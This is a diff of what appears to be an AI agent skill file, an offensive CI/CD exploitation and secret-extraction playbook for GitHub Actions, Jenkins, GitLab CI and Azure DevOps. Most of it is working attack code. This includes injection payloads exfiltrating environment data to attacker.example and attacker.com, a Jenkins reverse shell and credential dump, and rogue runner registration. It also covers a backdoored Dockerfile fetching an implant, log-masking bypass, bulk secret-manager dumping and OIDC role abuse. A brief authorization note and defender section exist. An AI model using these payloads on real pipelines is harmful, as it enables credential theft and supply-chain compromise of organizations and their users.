@@ -1,522 +1,320 @@
 ---
 name: offensive-cicd-pipeline
-description: "CI/CD exploitation: GitHub Actions injection, Jenkins RCE, GitLab CI, Azure DevOps, artifact poisoning. Triggers - Jenkins, GitHub Actions, GitLab CI, runner, pipeline."
+description: "CI/CD exploitation and secret extraction: GitHub Actions injection, Jenkins RCE, GitLab CI, Azure DevOps, artifact poisoning, Vault/KMS, runner tokens, OIDC. Triggers - Jenkins, GitHub Actions, CI secrets, runner, OIDC."
 ---
 
 ## Rules of Engagement
 Only test systems you are authorized to assess. Confirm the written scope and rate limits before active commands. Prefer the least-invasive check that proves impact; stop on evidence of production impact.
 
-# Offensive CI/CD Pipeline Exploitation
+# Offensive CI/CD Pipeline and Secrets Exploitation
 
-CI/CD pipelines represent one of the highest-value targets in modern infrastructure. A compromised
-pipeline grants code execution in trusted contexts, access to deployment credentials, and the ability
-to inject malicious code into production artifacts. You exploit the implicit trust that organizations
-place in their build systems -- pipelines run code with elevated privileges, hold secrets for
-deployment, and operate with minimal monitoring compared to production systems.
+A compromised pipeline executes code in trusted contexts, holds deployment credentials, and can
+inject malicious code into production artifacts. This skill covers GitHub Actions, Jenkins, GitLab
+CI, and Azure DevOps, from injection to code execution, plus the secret extraction paths that follow.
 
-This skill covers exploitation across the four dominant CI/CD platforms. You enumerate pipeline
-configurations, identify injection points, escalate from contributor-level access to arbitrary code
-execution, and leverage pipeline trust to move laterally through environments.
-
-MITRE ATT&CK: T1195.002 (Supply Chain Compromise: Compromise Software Supply Chain)
+MITRE ATT&CK: T1195.002 (Supply Chain Compromise), T1552 (Unsecured Credentials).
 
 ## Quick Workflow
 
-1. Enumerate accessible repositories and their pipeline configurations (.github/workflows/, Jenkinsfile, .gitlab-ci.yml, azure-pipelines.yml).
-2. Identify the trigger model -- which events execute pipelines, and which contexts carry attacker-controlled input.
-3. Map token scopes and available secrets for each pipeline context.
-4. Select the injection vector matching your access level (contributor, external PR, authenticated user).
-5. Craft the payload for the target platform's expression language or script engine.
-6. Execute and capture output -- secrets, tokens, or artifact modification.
-7. Pivot using captured credentials to expand access to other pipelines, registries, or infrastructure.
+1. Enumerate repositories and pipeline configs (`.github/workflows/`, `Jenkinsfile`, `.gitlab-ci.yml`, `azure-pipelines.yml`).
+2. Identify the trigger model, which contexts carry attacker-controlled input, and the token/secrets/federation scope.
+3. Select the injection vector matching your access level (contributor, external PR, authenticated user).
+4. Craft the payload for the target platform's expression language or script engine.
+5. Extract output -- environment, tokens, secrets, or modified artifacts -- and pivot across pipelines, registries, and cloud infrastructure.
 
 ---
 
-## GitHub Actions Expression Injection
+## GitHub Actions
 
-GitHub Actions evaluates expressions in `${{ }}` contexts. When attacker-controlled data flows into
-these expressions without sanitization, you achieve arbitrary command injection in the runner context.
+Attacker-controlled PR titles, issue bodies, branch names, and commit messages that flow into `run:`
+or action inputs, or untrusted code checked out under a privileged trigger, yield command execution.
 
-The most common injection surfaces are PR titles, issue bodies, branch names, and commit messages
-that flow into `run:` steps or action inputs.
+### Expression Injection
 
-Identify vulnerable workflows by searching for direct interpolation of event data:
+Search for interpolated event data in workflows:
 
 ```bash
-# Search for expression injection sinks in workflow files
-grep -rn '\${{.*github\.event\.' .github/workflows/
-grep -rn '\${{.*github\.head_ref' .github/workflows/
-grep -rn '\${{.*github\.event\.pull_request\.title' .github/workflows/
-grep -rn '\${{.*github\.event\.issue\.body' .github/workflows/
-grep -rn '\${{.*github\.event\.comment\.body' .github/workflows/
-grep -rn '\${{.*github\.event\.discussion\.body' .github/workflows/
+grep -rn '\${{.*\(github\.event\.\|github\.head_ref\)' .github/workflows/
 ```
 
-A vulnerable workflow looks like this:
+Vulnerable workflow and payload:
 
 ```yaml
-# Vulnerable: PR title flows directly into shell execution
-name: PR Greeting
 on: pull_request_target
 jobs:
   greet:
     runs-on: ubuntu-latest
     steps:
-      - run: |
-          echo "Thanks for PR: ${{ github.event.pull_request.title }}"
+      - run: echo "Thanks for PR: ${{ github.event.pull_request.title }}"
 ```
-
-You inject through the PR title:
 
 ```text
-"; curl -s https://attacker.com/exfil?token=$(cat $GITHUB_TOKEN) #
+"; curl -sS https://attacker.example/collect -d "$(env | base64)" #
 ```
 
-For `workflow_run` abuse, a workflow triggered by `workflow_run` runs in the context of the default
-branch but can access artifacts from the triggering workflow. You upload a poisoned artifact from a
-PR workflow, then the `workflow_run` workflow processes it with elevated privileges:
+### untrusted checkout and workflow_run
+
+`pull_request_target` runs with a privileged token and secrets while the PR code is untrusted. If the
+workflow checks out `github.event.pull_request.head.sha` and then builds or installs, attacker code
+runs with those secrets. The `workflow_run` trigger runs on the default branch but can read artifacts
+from the triggering workflow; upload a poisoned artifact from an unprivileged PR and the privileged
+handler processes it:
 
 ```yaml
-# Attacker's PR modifies the artifact upload step
 - uses: actions/upload-artifact@v4
-  with:
-    name: pr-data
-    path: payload.sh
-
-# The workflow_run handler in the default branch processes artifacts unsafely
-on:
-  workflow_run:
-    workflows: ["PR Build"]
-    types: [completed]
+  with: { name: pr-data, path: payload.sh }
+on: { workflow_run: { workflows: ["PR Build"], types: [completed] } }
 jobs:
   deploy:
-    runs-on: ubuntu-latest
     steps:
       - uses: actions/download-artifact@v4
-      - run: bash pr-data/payload.sh  # Executes attacker's code with write access
+      - run: bash pr-data/payload.sh
 ```
 
-Enumerate GITHUB_TOKEN permissions to understand your execution scope:
+Enumerate token scope with the `GITHUB_TOKEN` against `api.github.com/repos/$GITHUB_REPOSITORY`.
+
+Pin third-party actions to a commit SHA; mutable tags can be force-pushed. `gato` enumerates runners
+and injection sinks:
 
 ```bash
-# Inside a compromised workflow step, dump token permissions
-curl -sS -H "Authorization: token $GITHUB_TOKEN" \
-  -H "Accept: application/vnd.github+json" \
-  https://api.github.com/repos/$GITHUB_REPOSITORY | jq '.permissions'
-
-# Check if the token can push to the repository
-curl -sS -H "Authorization: token $GITHUB_TOKEN" \
-  https://api.github.com/repos/$GITHUB_REPOSITORY/git/refs/heads/main
-```
-
-Composite action supply chain attacks target reusable actions referenced without SHA pinning:
-
-```yaml
-# Vulnerable: references a tag that can be force-pushed
-- uses: org/custom-action@v1
-
-# Secure: references an immutable commit SHA
-- uses: org/custom-action@a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2
-```
-
-Use gato to enumerate and exploit GitHub Actions misconfigurations:
-
-```bash
-# Enumerate self-hosted runners and vulnerable workflows
-gato enumerate -t ghp_TOKENHERE -r org/repo
 gato enumerate -t ghp_TOKENHERE -o target-org
-
-# Search for expression injection across an organization
-gato search -t ghp_TOKENHERE -o target-org -sg
 ```
 
 ---
 
-## Jenkins Exploitation
+## Jenkins
 
-Jenkins presents a broad attack surface through its script console, build configurations, shared
-libraries, and the Java remoting protocol. You target Jenkins when you discover it exposed on the
-network or when you obtain any level of authenticated access.
+### Script Console RCE
 
-### Groovy Script Console RCE
-
-If you have access to the script console (requires Overall/RunScripts permission), you have
-unrestricted code execution on the Jenkins controller:
+Script console access (Overall/RunScripts) is unrestricted controller code execution:
 
 ```groovy
-// Direct command execution via script console
-def cmd = "id && cat /etc/passwd".execute()
-println cmd.text
+println "id && cat /etc/passwd".execute().text
 
-// Reverse shell from Jenkins controller
-def proc = ["bash", "-c", "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"].execute()
-
-// Read Jenkins secrets directly
-import hudson.util.Secret
 import com.cloudbees.plugins.credentials.CredentialsProvider
 import com.cloudbees.plugins.credentials.common.StandardUsernamePasswordCredentials
-
 def creds = CredentialsProvider.lookupCredentials(
-    StandardUsernamePasswordCredentials.class,
-    Jenkins.instance, null, null
-)
-creds.each { c ->
-    println("ID: ${c.id}")
-    println("Username: ${c.username}")
-    println("Password: ${c.password.plainText}")
-    println("---")
-}
+    StandardUsernamePasswordCredentials.class, Jenkins.instance, null, null)
+creds.each { c -> println("${c.id} ${c.username} ${c.password.plainText}") }
 ```
 
-### Groovy Sandbox Escape
+The Groovy sandbox does not apply to the script console. With only build-configuration access,
+prefer legitimate pipeline steps that print or move credentials; sandbox-escape tricks are
+version-dependent and unreliable.
 
-Pipeline scripts run in a Groovy sandbox, but you bypass it through meta-programming and reflection:
+Offline `credentials.xml` decryption needs `secrets/master.key` and `secrets/hudson.util.Secret`
+from `$JENKINS_HOME`: SHA-256 the master key, AES-ECB-decrypt the hudson secret with its first 16
+bytes, then AES-128-CBC-decrypt entries with that key (IV is bytes 1-17 of the ciphertext).
 
-```groovy
-// Sandbox escape via meta-class manipulation
-@Grab('commons-io:commons-io:2.11.0')
-import org.apache.commons.io.IOUtils
+### Remoting Deserialization
 
-// Bypass via method pointer and reflection
-def bypass = evaluate('''
-class Evil {
-    static void main(String[] args) {}
-    static Object run() {
-        def proc = "id".execute()
-        return proc.text
-    }
-}
-Evil.run()
-''')
-println bypass
-```
-
-### Jenkins Remoting Deserialization
-
-When the Jenkins remoting port (typically 50000) is exposed, you exploit Java deserialization
-vulnerabilities:
-
-```bash
-# Identify Jenkins remoting port
-nmap -sV -p 50000 TARGET_IP
-
-# Use ysoserial to generate deserialization payloads
-java -jar ysoserial.jar CommonsCollections1 'curl http://ATTACKER_IP/pwned' > payload.bin
-
-# Deliver via the JNLP protocol
-python3 jenkins_exploit.py --target TARGET_IP:50000 --payload payload.bin
-```
+An exposed remoting port (default 50000) exposes the Java remoting protocol. Test known gadget
+chains with `ysoserial` against the JNLP handshake. Network-visible and may crash the controller;
+treat it as a last resort.
 
 ### Shared Library Injection
 
-Jenkins shared libraries loaded via `@Library` are a supply chain vector. If you compromise the
-library repository, every pipeline using it executes your code:
-
-```groovy
-// Malicious shared library vars/deploy.groovy
-def call(Map config) {
-    // Original functionality preserved to avoid detection
-    sh "kubectl apply -f ${config.manifest}"
-
-    // Injected exfiltration
-    sh '''
-        env | base64 | curl -X POST -d @- https://attacker.com/collect
-    '''
-}
-```
-
-Use jenkins-attack-framework for systematic exploitation:
+`@Library` shared libraries are a supply chain vector: write access to the library repo executes in
+every consuming pipeline. `jenkins-attack-framework` automates enumeration and credential dump:
 
 ```bash
-# Enumerate Jenkins instance
-python3 jaf.py --url https://jenkins.target.com --enumerate
-
-# Dump all credentials with valid session
-python3 jaf.py --url https://jenkins.target.com --cookie "JSESSIONID=abc123" --dump-creds
-
-# Execute command via available build nodes
-python3 jaf.py --url https://jenkins.target.com --cookie "JSESSIONID=abc123" \
-  --exec "whoami" --node "linux-build-01"
+python3 jaf.py --url https://jenkins.example --cookie "JSESSIONID=abc123" --dump-creds
 ```
 
 ---
 
-## GitLab CI Exploitation
+## GitLab CI
 
-GitLab CI pipelines execute based on `.gitlab-ci.yml` and support powerful features that create
-exploitation opportunities. You target variable injection, runner abuse, and trust boundary
-violations between merge requests and protected branches.
+### Merge Request Pipeline Injection
 
-### YAML Injection via Merge Requests
-
-When a project allows merge request pipelines from forks, the attacker's `.gitlab-ci.yml`
-executes on the target's runners:
+With fork MR pipelines enabled, the fork's `.gitlab-ci.yml` runs on target runners with project
+variables:
 
 ```yaml
-# Attacker's .gitlab-ci.yml in a fork
-stages:
-  - exploit
-
-dump_secrets:
-  stage: exploit
+dump:
   script:
     - env | sort
-    - cat /etc/hosts
-    - curl -sS --header "PRIVATE-TOKEN: $CI_JOB_TOKEN" \
-        "https://gitlab.target.com/api/v4/projects/$CI_PROJECT_ID/variables" | python3 -m json.tool
-    - |
-      # Attempt to read secrets from runner filesystem
-      find / -name "*.env" -o -name "credentials" -o -name "*.key" 2>/dev/null | head -20
-      cat ~/.docker/config.json 2>/dev/null || true
+    - curl -sS --header "JOB-TOKEN: $CI_JOB_TOKEN" \
+        "https://gitlab.example/api/v4/projects/$CI_PROJECT_ID/variables" | jq '.'
 ```
+
+Protected variables reach protected refs only; fork MRs and unprotected branches receive only
+unprotected variables. Map that boundary first.
 
 ### Runner Registration Token Abuse
 
-If you obtain a runner registration token, you register a rogue runner that intercepts jobs:
+A leaked registration token registers a rogue runner:
 
 ```bash
-# Register a malicious runner with broad tag matching
-gitlab-runner register \
-  --non-interactive \
-  --url "https://gitlab.target.com/" \
-  --registration-token "GR1348941_STOLEN_TOKEN" \
-  --executor "shell" \
-  --description "build-node-07" \
-  --tag-list "docker,linux,build,deploy" \
-  --run-untagged="true"
-
-# The rogue runner now receives jobs and can:
-# 1. Capture all environment variables including secrets
-# 2. Modify build artifacts before they are published
-# 3. Inject code into deployment payloads
+gitlab-runner register --non-interactive --url "https://gitlab.example/" \
+  --registration-token "STOLEN_TOKEN" --executor shell \
+  --tag-list "docker,linux,deploy" --run-untagged true
 ```
 
-### CI Variable Extraction
-
-Enumerate and extract CI/CD variables using the API with a compromised token:
-
-```bash
-# List project-level variables
-curl -sS --header "PRIVATE-TOKEN: $GITLAB_TOKEN" \
-  "https://gitlab.target.com/api/v4/projects/PROJECT_ID/variables" | jq '.[] | {key, value, protected, masked}'
-
-# List group-level variables (inherited by all projects)
-curl -sS --header "PRIVATE-TOKEN: $GITLAB_TOKEN" \
-  "https://gitlab.target.com/api/v4/groups/GROUP_ID/variables" | jq '.[] | {key, value}'
-
-# Instance-level variables (requires admin)
-curl -sS --header "PRIVATE-TOKEN: $GITLAB_TOKEN" \
-  "https://gitlab.target.com/api/v4/admin/ci/variables" | jq '.'
-```
-
-### Protected Branch Bypass
-
-Exploit the gap between merge request pipelines and branch pipelines to run code in protected
-contexts:
-
-```bash
-# Create a merge request that modifies .gitlab-ci.yml
-# The MR pipeline runs with the source branch's CI config
-# but in the context of the target project's runners and variables
-
-# If the project has "Run pipelines for merge requests from forked projects" enabled,
-# your fork's .gitlab-ci.yml executes on their infrastructure
-git checkout -b exploit-branch
-cat > .gitlab-ci.yml << 'EOF'
-protected_job:
-  script:
-    - echo "$DEPLOY_KEY" | base64
-    - echo "$AWS_SECRET_ACCESS_KEY" | base64
-  only:
-    - merge_requests
-EOF
-git add .gitlab-ci.yml && git commit -m "Update CI config" && git push origin exploit-branch
-```
+It captures job environment variables and modifies artifacts before publishing. Treat the token as
+equivalent to interception of every matching job.
 
 ---
 
-## Azure DevOps Pipeline Exploitation
+## Azure DevOps
 
-Azure DevOps pipelines use YAML or classic editor definitions. You target pipeline agent compromise,
-service connection abuse, and variable group extraction.
+### Agent Abuse
 
-### Pipeline Agent Abuse
-
-Self-hosted agents retain state between builds. You exploit this persistence:
+Self-hosted agents persist state between builds:
 
 ```yaml
-# azure-pipelines.yml payload targeting self-hosted agent
-trigger: none
-pr: none
-
-pool:
-  name: 'Self-Hosted-Pool'
-
+pool: { name: 'Self-Hosted-Pool' }
 steps:
 - script: |
-    # Enumerate the agent environment
-    whoami
-    hostname
     env | sort
-
-    # Search for cached credentials on the agent
     find /home/ -name ".kube" -o -name ".aws" -o -name ".azure" 2>/dev/null
-    cat /home/*/.kube/config 2>/dev/null
-    cat /home/*/.aws/credentials 2>/dev/null
-
-    # Check for Docker credentials
-    cat /home/*/.docker/config.json 2>/dev/null
-
-    # Look for other pipeline artifacts left behind
-    ls -la /agent/_work/
-    find /agent/_work/ -name "*.env" -o -name "*.key" -o -name "*.pem" 2>/dev/null
-  displayName: 'Agent Recon'
+    cat /home/*/.aws/credentials /home/*/.kube/config 2>/dev/null
 ```
 
 ### Service Connection Theft
 
-Service connections in Azure DevOps store credentials for external systems. You extract them
-through pipeline execution:
+Service connections inject external credentials into tasks. With edit access, wrap the connection in
+`AzureCLI@2` and extract the token:
 
 ```yaml
-steps:
 - task: AzureCLI@2
   inputs:
     azureSubscription: 'Production-Azure-Connection'
-    scriptType: 'bash'
-    scriptLocation: 'inlineScript'
+    scriptType: inlineScript
     inlineScript: |
-      # The task injects credentials as environment variables
-      echo "Tenant: $tenantId"
-      echo "Client: $servicePrincipalId"
-
-      # Extract the service principal token
       az account get-access-token --output json
-
-      # Use the managed identity to enumerate Azure resources
-      az resource list --output table
-      az keyvault list --output table
       az keyvault secret list --vault-name TARGET_VAULT --output table
 ```
 
-### Variable Group Extraction
+A compromised PAT extracts variable groups and connection metadata over REST:
 
 ```bash
-# Use the Azure DevOps REST API with a compromised PAT
-PAT="STOLEN_PAT_HERE"
-ORG="target-org"
-PROJECT="target-project"
-
-# List variable groups
 curl -sS -u ":$PAT" \
   "https://dev.azure.com/$ORG/$PROJECT/_apis/distributedtask/variablegroups?api-version=7.0" \
   | jq '.value[] | {name, variables}'
-
-# List service connections
-curl -sS -u ":$PAT" \
-  "https://dev.azure.com/$ORG/$PROJECT/_apis/serviceendpoint/endpoints?api-version=7.0" \
-  | jq '.value[] | {name, type, authorization}'
 ```
 
 ---
 
-## Artifact Poisoning
+## Secret Extraction
 
-Artifact poisoning targets the handoff between build and deploy stages. You modify build outputs
-to inject malicious code into deployment packages.
+### Environment, Logs, and Caches
+
+Environment variables are the first extraction path on every platform. Log masking matches known
+secret values; encoding the output defeats it. Write dumps to evidence rather than exfiltrating
+inline -- DNS and ICMP channels are slow and rate-limited.
 
 ```bash
-# GitHub Actions: Intercept artifact upload
-# In a compromised build step, modify artifacts before upload
-echo 'curl https://attacker.com/beacon' >> dist/entrypoint.sh
-
-# GitLab CI: Poison the artifact cache
-# Shared caches between pipelines allow cross-job poisoning
-cat > .gitlab-ci.yml << 'EOF'
-poison_cache:
-  script:
-    - echo 'malicious_payload()' >> node_modules/.cache/babel-loader/payload.js
-  cache:
-    key: shared-build-cache
-    paths:
-      - node_modules/
-    policy: push
-EOF
-
-# Jenkins: Modify stashed files between stages
-# If you control a build node, modify files after stash
-# The unstash on a different node receives your modified files
+env | sort
+env | base64   # bypass value masking
+env | grep -iE '^(AWS_|AZURE_|GCP_|GITHUB_|GITLAB_|DOCKER_|VAULT_|SSH_|API_KEY|SECRET|TOKEN|PASSWORD)'
+env | grep -E '=ghp_[A-Za-z0-9]{36}|=glpat-[A-Za-z0-9_-]{20}|=AKIA[A-Z0-9]{16}'  # token shapes
 ```
 
-Container image poisoning in registry pipelines:
+Build logs leak unmasked credentials through careless scripting and debug output:
 
-```dockerfile
-# Inject a backdoor layer into a build pipeline's Dockerfile
-FROM base-image:latest
-# Legitimate build steps
-COPY . /app
-RUN npm install && npm run build
-# Injected persistence
-RUN curl -sS https://attacker.com/implant -o /usr/local/bin/.svc && chmod +x /usr/local/bin/.svc
-ENTRYPOINT ["/usr/local/bin/.svc", "--", "/app/entrypoint.sh"]
+```bash
+curl -sS -L -H "Authorization: token $GITHUB_TOKEN" \
+  "https://api.github.com/repos/OWNER/REPO/actions/runs/$RUN_ID/logs" -o logs.zip
+unzip -o logs.zip -d logs && \
+  grep -rihE '(AKIA[A-Z0-9]{16}|ghp_[A-Za-z0-9]{36}|eyJ[A-Za-z0-9_-]+\.eyJ)' logs/
+curl -sS -u "user:$JENKINS_TOKEN" "https://jenkins.example/job/JOB/lastBuild/consoleText"
+```
+
+Caches and artifacts cross job boundaries: a `cache: policy: push` job can seed a path pulled by a
+later privileged job. Verify what the consuming job executes from cache before relying on it.
+
+### Vault and Cloud Secret Managers
+
+Reuse the token the pipeline already holds:
+
+```bash
+vault secrets list
+curl -sS -H "X-Vault-Token: $VAULT_TOKEN" "$VAULT_ADDR/v1/sys/capabilities-self" \
+  -d '{"paths":["secret/*","aws/*","database/*"]}' | jq '.'   # often over-permissioned for CI
+aws secretsmanager list-secrets --query 'SecretList[].Name' --output text | tr '\t' '\n' | \
+  while read n; do aws secretsmanager get-secret-value --secret-id "$n" --query SecretString --output text; done
+aws ssm get-parameters-by-path --path "/" --recursive --with-decryption
+az keyvault secret list --vault-name "$VAULT" --query '[].name' --output tsv | \
+  while read n; do az keyvault secret show --vault-name "$VAULT" --name "$n" --query value -o tsv; done
+gcloud secrets list --format='value(name)' | while read n; do gcloud secrets versions access latest --secret="$n"; done
+```
+
+Instance metadata also serves runner credentials at `169.254.169.254` (AWS IMDS, Azure IMDS, GCP
+metadata).
+
+### OIDC Federation Abuse
+
+OIDC assumes cloud roles without stored credentials; the weakness is an over-broad trust policy.
+Inspect the `sub` claim:
+
+```yaml
+- run: |
+    TOKEN=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+      "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r '.value')
+    echo "$TOKEN" | cut -d. -f2 | base64 -d | jq '.'
+```
+
+A policy conditioned on `repo:target-org/*` accepts any repository in the organization; assume the
+role from a workflow you control:
+
+```bash
+aws sts assume-role-with-web-identity \
+  --role-arn "arn:aws:iam::ACCOUNT:role/deploy-role" \
+  --role-session-name exploit --web-identity-token "$TOKEN"
+```
+
+GitLab uses `id_tokens`; a trust policy that omits `ref_protected` is assumable from an unprotected
+branch:
+
+```yaml
+job:
+  id_tokens:
+    AWS_TOKEN: { aud: https://aws.amazon.com }
+  script:
+    - echo "$AWS_TOKEN" | cut -d. -f2 | base64 -d | jq '.'
+```
+
+### Runner Tokens and Credential Stores
+
+Filesystem credentials support job interception and controller access:
+
+```bash
+cat /home/runner/.runner /home/runner/.credentials 2>/dev/null   # GitHub self-hosted
+grep -E '(token|url)' /etc/gitlab-runner/config.toml 2>/dev/null
+find / -name "secret.key" -path "*/jenkins/*" 2>/dev/null
+cat ~/.docker/config.json 2>/dev/null | jq '.'                  # registry credentials
+```
+
+GitHub and GitLab secrets are only readable as names over the API; values require the execution
+context above:
+
+```bash
+curl -sS -H "Authorization: token $GITHUB_TOKEN" \
+  "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/secrets" | jq '.secrets[].name'
 ```
 
 ---
 
 ## Detection / Defender View
 
-Defenders should monitor for these indicators across their CI/CD platforms:
+Monitor for workflow-file changes in fork PRs; new runner registrations with broad tag matching; CI
+jobs accessing secrets they historically did not; shell metacharacters in PR titles or issue bodies;
+unexpected artifact hash changes; token calls outside scope; Jenkins script-console use; builds that
+run longer than baseline; runner egress to non-registry hosts.
 
-- **Workflow modifications**: Alert on changes to `.github/workflows/`, `Jenkinsfile`, `.gitlab-ci.yml`, or `azure-pipelines.yml` in pull requests from external contributors or forks.
-- **Unusual runner registration**: New runner registrations, especially with broad tag matching or from unexpected IP ranges.
-- **Secret access patterns**: CI jobs accessing secrets they have not historically used, or secrets being accessed in PR-triggered pipelines.
-- **Expression injection signatures**: PR titles or issue bodies containing shell metacharacters (`$()`, backticks, semicolons, pipe operators) adjacent to workflow trigger events.
-- **Artifact integrity**: Hash verification of build artifacts between pipeline stages; unexpected changes indicate poisoning.
-- **Token scope anomalies**: GITHUB_TOKEN or CI_JOB_TOKEN making API calls outside the expected scope of the pipeline (e.g., accessing other repositories, modifying branch protections).
-- **Jenkins audit log**: Script console access, credential enumeration via the API, and new node registrations from unauthorized sources.
-- **Build duration anomalies**: Compromised builds often take longer due to exfiltration steps or additional network calls.
-- **Outbound network from runners**: Build agents making connections to unexpected external hosts, especially data exfiltration over DNS or HTTPS to non-registry domains.
-
-Key defensive controls:
-
-- Pin all GitHub Actions to full commit SHAs, not tags.
-- Restrict `pull_request_target` usage and never check out PR code in that context.
-- Use ephemeral runners that are destroyed after each job.
-- Implement OIDC for cloud authentication instead of storing long-lived credentials.
-- Enable branch protection rules requiring review for workflow file changes.
-- Segment runner pools by trust level -- never share runners between public and private repositories.
-
----
-
-## Engagement Cheatsheet
-
-| Platform        | Vector                       | Access Required         | Impact          |
-|-----------------|------------------------------|-------------------------|-----------------|
-| GitHub Actions  | Expression injection         | Fork/PR (none)          | Runner RCE      |
-| GitHub Actions  | workflow_run artifact poison | Fork/PR (none)          | Default branch RCE |
-| GitHub Actions  | Composite action supply chain| Action repo write       | All consumers RCE |
-| Jenkins         | Script console               | RunScripts permission   | Controller RCE  |
-| Jenkins         | Groovy sandbox escape        | Build configure         | Controller RCE  |
-| Jenkins         | Remoting deserialization     | Network access (50000)  | Controller RCE  |
-| Jenkins         | Shared library injection     | Library repo write      | All consumers RCE |
-| GitLab CI       | MR pipeline YAML injection   | Fork (none)             | Runner RCE      |
-| GitLab CI       | Runner token registration    | Token leak              | Job interception |
-| GitLab CI       | Variable extraction          | API token               | Secret theft    |
-| Azure DevOps    | Agent persistence            | Pipeline edit           | Agent RCE       |
-| Azure DevOps    | Service connection theft     | Pipeline edit           | Cloud access    |
-| All Platforms   | Artifact poisoning           | Build step compromise   | Supply chain    |
+Controls: pin actions to commit SHAs; never check out PR head under `pull_request_target`; use
+ephemeral runners and scrub persistent ones; use OIDC with narrow claim constraints; require review
+for workflow changes; segment runner pools by trust level; audit secrets access; least privilege.
 
 ---
 
 ## Key References
 
 - OWASP Top 10 CI/CD Security Risks: https://owasp.org/www-project-top-10-ci-cd-security-risks/
-- Cider Security (now Palo Alto) CI/CD Goat: https://github.com/cider-security-research/cicd-goat
-- gato - GitHub Actions enumeration and attack tool: https://github.com/praetorian-inc/gato
+- CI/CD Goat: https://github.com/cider-security-research/cicd-goat
+- gato: https://github.com/praetorian-inc/gato
 - jenkins-attack-framework: https://github.com/Accenture/jenkins-attack-framework
-- Abusing GitHub Actions (Synacktiv): https://www.synacktiv.com/en/publications
 - MITRE ATT&CK T1195.002: https://attack.mitre.org/techniques/T1195/002/
-- GitHub Actions Security Hardening: https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions
-- Attacking and Defending CI/CD Pipelines (NCC Group): https://research.nccgroup.com
-- GitLab CI/CD Security: https://docs.gitlab.com/ee/ci/security/
-- Azure DevOps Pipeline Security: https://learn.microsoft.com/en-us/azure/devops/pipelines/security/
+- MITRE ATT&CK T1552: https://attack.mitre.org/techniques/T1552/
+- truffleHog: https://github.com/trufflesecurity/trufflehog
